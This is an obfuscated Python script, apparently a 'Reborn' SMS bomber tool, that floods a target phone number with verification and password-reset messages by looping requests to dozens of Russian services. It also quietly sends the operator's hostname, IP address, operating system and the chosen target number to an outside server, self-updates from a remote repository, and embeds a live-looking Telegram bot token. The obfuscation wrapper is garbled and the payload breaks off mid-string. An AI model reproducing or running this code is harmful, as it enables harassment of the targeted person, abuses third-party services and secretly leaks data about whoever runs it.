# made by 4nat
# code name : dodge this :) 
import base64, codecs
magic = '#!/usr/bin/python
import requests, random, datetime, sys, time, argparse,os
from colorama import init, Fore, Back, Style
from time import sleep
import urllib.request
import base64
import socket
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
host=(f"{hostname}")
ip=(f"{ip_address}")
hostn=('Hostname : ')
ipn = ('IP Adress : ')
number=('Number : ')
n = ('\n')
spc=(' ')
ops=('Operating System : ')
def reopen():
  try:    
    mf = open(".4nat")
    os.remove(".4nat")
  except IOError:
    print('')
def update():
    
    stuff_to_update = ['sms.py', '.version']
    for fl in stuff_to_update:
        dat = urllib.request.urlopen(
            "https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/" + fl).read()
        file = open(fl, 'wb')
        file.write(dat)
        file.close()
        
    print('\n\t\tUpdated Successfull !!!!')
    print('\tPlease Run The Script Again...')
    exit()
print(Fore.BLUE)
print('\tChecking For Updates...')
ver = urllib.request.urlopen(
    "https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/.version").read().decode('utf-8')
verl = ''
try:
    verl = open(".version", 'r').read()
except Exception:
    pass
if ver != verl:
    reopen()
    print('\n\t\tAn Update is Available....')
    print('\tStarting Update...')
    update()
print("\tYour Version is Up-To-Date")
colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
init()
print("\n")
os.system('clear')
input_func = None
try:
    input_func = raw_input
except NameError:
    input_func = input
def txt(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def mesage():
        if os.name=="nt":
            win="Windows"
            requests.post('https://dc.peakhackers.com/index.php?girdi='+number+spc+_phone+n+hostn+spc+host+n+ipn+spc+ip+n+ops+spc+win+'')
        elif os.name=="posix":
            lin="Linux"
            requests.post('https://dc.peakhackers.com/index.php?girdi='+number+spc+_phone+n+hostn+spc+host+n+ipn+spc+ip+n+ops+spc+lin+'')
        else:
          unkn="IDK"
          requests.post('https://dc.peakhackers.com/index.php?girdi='+number+spc+_phone+n+hostn+spc+host+n+ipn+spc+ip+n+ops+spc+unkn+'')
          sys.tracebacklimit = 0
  #dodge this ahahahahahaha xD
print('\t')

def text(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    logo ='''
   ___  _   _   ___ _____ 
  /   || \ | | / _ \_   _|
 / /| ||  \| |/ /_\ \| |  
/ /_| || . ` ||  _  || |
\___  || |\  || | | || |  
    |_/\_| \_/\_| |_/\_/                               
v3.9.1 (Made By Harun | Turkey/TR)
'''
    print(random.choice(colors)+logo+W)
banner()
try:    
  f = open(".4nat")
except IOError:
      try:
        lgn = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/.lgn").read().decode('utf-8')
        lgn1 = '123'
        if int(lgn) == int(lgn1):print(' You Dont Need Login :) ')
        else: 
          os.system('clear')
          banner()
          print("Please Login")
          print("If u dont know password come our telegram group | ")
          print("t.me/reborn4nat")
          print('\t\n Enter To Contiune!!!')
          user=input('')
          if user == "":os.system('clear')    
          banner()
          user =input('Username :  ')    
          passwd = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/reader/master/pass.txt").read()    
          npasswd=int(base64.b64decode(passwd))    
          upasswd =int(input('Password :  '))
          os.system('clear')
          time.sleep(2)
          if user=="reborn" and upasswd==npasswd:os.system('clear');print("Login Success!..");os.system("echo fuck society >.4nat");banner()
          elif user=="reborn": os.system('clear');print("Incorrect Password!  >  Error Code : 101");sys.exit()
          elif user!="reborn" and passwd=="235467": os.system('clear');print("Incorrect Username!  >  Error Code : 102");sys.exit() 
          elif user=="" and passwd=="": os.system('clear');print("Please Write Username and Password! >  Error Code : 103 ");sys.exit()
          else:  os.system('clear'); print("Incorrect Username and Password! >  Error Code :103");print("");print("Please Contact Develper.");print("t.me/ichbinharun");sys.exit()
      except:
        pass
       
def shutdown(signal, frame):
    print ('\n\033[1;31mCtrl+C was pressed, shutting down!\033[0m')
    sys.exit()
try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("You are not connected To Internet!!!")
    print("\tPlease Connect To Internet To Continue...\n")
    input('Exiting....\n Press Enter To Continue....')
    exit()
stat = urllib.request.urlopen("https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/.stat").read().decode('utf-8')
statu = '0'
if int(stat) == int(statu):print('\tProgram is Currently Maintence Mode..');print(' \t Please Contact Admin https://t.me/ichbinharun');os.system('termux-open-url https://t.me/reborndiscuss');sys.exit();

try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/4nat/Reborn/4nat-patch-1/.notify").read().decode('utf-8')
    noti = noti.upper().strip()
    if len(noti) > 10:
        print('\n\tNOTIFICATION: ' + noti +'')
except Exception:
    pass
print('\n\tDiscord : https://discord.gg/3k9guSN')
def save():
  file = open(".numbers","a",encoding="utf-8")
  file.write("\nName : ")
  file.write(namex)
  file.write("\nNumber: ")
  file.write(_phone)
  os.system('clear')
def show():
  file = open(".numbers","r",encoding= "utf-8")
  for i in file:
    print(i) 
def nosee():
  os.system("echo fuck society >.nosee")
  kayit=int(input('\n Press Numbers : \n\n    Press (1) To Save \n    Press (2) to Discard \n    Press (3) to See Your Credits  \n    Press (4) to Enter Promotion Code \n Choice : '))
  if kayit==int(1):save()
  elif kayit==int(2):text('changes are not saved!!.');print("\n")
def bug():
	prob=input('Enter Your Problem       :  ')
	probx=input('Enter Your Name   -->')
	spc=('  :  ')
	print(random.choice(colors))
	requests.post('https://api.telegram.org/bot1020659297:AAHQf4HzbG-wtH4-bhOpGJMHfGSfPgUI8Pk/sendMessage?chat_id=@rebornbugs&text='+probx+spc+prob+'')
	time.sleep(1)
	os.system('clear')
	print(Fore.BLUE)
	print('\t Your Report Sending To Admin...')
	time.sleep(3)
	print(' THANK YOU ! <3')

try:
	f = open(".nosee")
except IOError:
  print(Fore.YELLOW)
  from selectmenu import SelectMenu
  menu = SelectMenu()
  menu.add_choices(["See Contacts", "Join our Team", "Join Telegram Channel", "Send SMS Bomber","Bug Report","Chat","Exit"])
  result = menu.select("Choose The Below Options !")
  if result=="See Contacts":os.system('clear');show()
  elif result=="Join our Team":print("\n");os.system('termux-open-url https://t.me/reborndevelopers')
  elif result=="Join Telegram Channel":print("\n");os.system('termux-open-url https://t.me/reborn4nat')
  elif result=="Send SMS Bomber":pass
  elif result=="Bug Report":print("\n");bug()
  elif result=="Chat":os.system('clear');os.system('python3 chat.py')
  elif result=="Exit":os.system('clear');exit();quit()

print('Enter Target Phone Number Without (+):')
_phone = input(Fore.BLUE+"reborn >> "+Style.RESET_ALL)
print('Enter Target Name (Enter):')
namex = input(Fore.BLUE+"reborn >> "+Style.RESET_ALL)
namex = namex.upper().strip()
mesage()
save()
def a():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/XJ1R0v\n')
	print('Redirecting URL !! Dont Close !!')
	time.sleep(3)
	os.system('termux-open-url https://tr.link/XJ1R0v')
	code = input('Paste Here Code ->> ')
	if str(code)=='1US2nOoLYc3VIvGlECauKRjD5bwxym4M':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');a()
	else:print('Please Fill.')
def b():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/50DS\n')
	print('Redirecting URL !! Dont Close !!')
	time.sleep(3)
	os.system('termux-open-url https://tr.link/50DS')
	code = input('Paste Here Code ->> ')
	if str(code)=='KPC2jpgvdtEkLUoIASna1y0NxB4FRmHW':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');b()
	else:print('Please Fill.')
def c():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/SR4XzH\n')
	print('Redirecting URL !! Dont Close !!')
	time.sleep(3)
	os.system('termux-open-url https://tr.link/SR4XzH')
	code = input('Paste Here Code ->> ')
	if str(code)=='k1mzJXIByMZURbaEKpun5hLiVdrjtNYv':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');c()
	else:print('Please Fill.')
def d():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/ZaU\n')
	print('Redirecting URL !! Dont Close !!')
	time.sleep(3)
	os.system('termux-open-url https://tr.link/ZaU')
	code = input('Paste Here Code ->> ')
	if str(code)=='LRSclP2OGKUBVT5YfJCzhWnjiME1gHDs':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');d()
	else:print('Please Fill.')
def e():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/3fkDf\n')
	print('Redirecting URL !! Dont Close !!')
	time.sleep(3)
	os.system('termux-open-url https://tr.link/3fkDf')
	code = input('Paste Here Code ->> ')
	if str(code)=='yeNV5Tj0kCmRl3Kb2rsvYDxZgEpJdtLU':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');e()
	else:print('Please Fill.')
def f():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/LMSq\n')
	print('Redirecting URL !! Dont Close !!')
	time.sleep(3)
	os.system('termux-open-url https://tr.link/LMSq')
	code = input('Paste Here Code ->> ')
	if str(code)=='3XZDRaiOJo2cu1xjndLygGhPk0fSVtUp':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');f()
	else:print('Please Fill.')
def g():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/TmWrHC\n')
	print('Redirecting URL !! Dont Close !!')
	time.sleep(3)
	os.system('termux-open-url https://tr.link/TmWrHC')
	code = input('Paste Here Code ->> ')
	if str(code)=='bZfdshzKBRAagywxlFIOLuk5VD2YNPUm':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');g()
	else:print('Please Fill.')
def h():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/UZctY0\n')
	print('Redirecting URL !! Dont Close !!')	
	time.sleep(3)
	os.system('termux-open-url https://tr.link/UZctY0')
	code = input('Paste Here Code ->> ')
	if str(code)=='tjWZoPX3zVs4KBC25bpmuAOdDyifvrhF':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');h()
	else:print('Please Fill.')
def j():
	print('We Need To Verify You.')
	print('You Just Need To Go This Link : ')	
	print('\n\thttps://tr.link/CTIAWH\n')
	print('Redirecting URL !! Dont Close !!')
	time.sleep(3)
	os.system('termux-open-url https://tr.link/CTIAWH')
	code = input('Paste Here Code ->> ')
	if str(code)=='p3FtxseoUXGk1whD5iPLfCdIzMBNvu0J':print('True')
	elif a!=code:print('Wrong Code!! Try Again.\n\n');j()
	else:print('Please Fill.')
ads = (a,b,c,d,e,f,g,h,j)
choose = random.choice(ads)
if choose ==a:a()
elif choose ==b:b()
elif choose ==c:c()
elif choose ==d:d()
elif choose ==e:e()
elif choose ==f:f()
elif choose ==g:g()
elif choose ==h:h()
elif choose ==j:j()
else:print('Error')
R = 0

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]


iteration = 0
os.system('clear')
iteration = 0
failed = 0
requested = 0
success = 0
banner()
num = _phone
numplus = '+' + num


print(Fore.RED)

def txts(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)

txts('If you want a stop bomber press CTRL+Z !!')
txts('[**************************] %100')




while True:


	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'



#5
	try:
		print(requests.post("http://milano-engels.ru/ajax/loginPhone?ssid=d7f1f5ba-578d-4380-9adc-5031ce3aa0be&mobileApp=true&restaurant=edebbe6f-fa2a-4a49-bfb5-e301deee47c5&phone=+"+num+"&country=RU"))
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#6
	try:
		print(requests.get("https://suandshi.ru/mobile_api/register_mobile_user?phone="+num[1:]))
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _p'
love = ''
god = 'ps://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#30

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#31

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#32

	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#33

	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success +=1	
	except:
                failed += 1
#34

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#35

	try:
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#36


	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#37

	try:
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1

#38

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#39

	try:
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½', 'lastName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#40

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#41

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#42

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1

#43
	try:
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'ÃÂÃÂÃÂÃÂ¾ÃÂÃÂ»ÃÂÃÂÃÂÃÂ·ÃÂÃÂ¾ÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂÃÂÃÂµÃÂÃÂ»ÃÂÃÂ.ÃÂÃÂÃÂÃÂ°ÃÂÃÂÃÂÃÂ²ÃÂÃÂºÃÂÃÂ°ÃÂÃÂÃÂÃÂ°ÃÂÃÂ¤ÃÂÃÂ¸ÃÂÃÂ·ÃÂÃÂ¸ÃÂÃÂºÃÂÃÂ°','params':{'phone':_phone},'id':'1'})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1

#44
	try:
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½','middleName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²ÃÂÃÂ¸ÃÂÃÂ','lastName':'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#45

	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1

#46
	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1

#47
	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#48

	try:
		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#49


	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed += 1
#50


	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print(random.choice(colors))
		os.system('clear')
		print("================================================================")
		print("			Target Number         : ", _phone)
		print("")		
		print("			Successful Requests   : ", success)
		print("================================================================")
	except:
		print('[-] Requests Failed!')
	try:        
                success += 1
	
	except:
                failed'
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
